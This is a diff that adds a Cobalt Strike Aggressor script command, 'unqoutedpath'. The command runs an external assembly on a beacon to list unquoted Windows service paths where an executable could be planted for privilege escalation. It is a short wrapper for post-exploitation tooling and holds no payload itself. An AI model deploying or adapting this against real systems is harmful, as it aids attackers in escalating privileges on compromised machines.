@@ -1,0 +1,19 @@
+beacon_command_register("unqoutedpath", "Outputs a list of unquoted service paths that aren't in System32/SysWow64 to plant a PE into.",
+	"Usage: unqoutedpath No arguments needed \n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+alias unqoutedpath{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$asm = "/opt/cobalt_strike_extension_kit/exe/UnqoutedPath.exe";
+	$desc = "UnqoutedPath";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, $asm, $argu);
+}
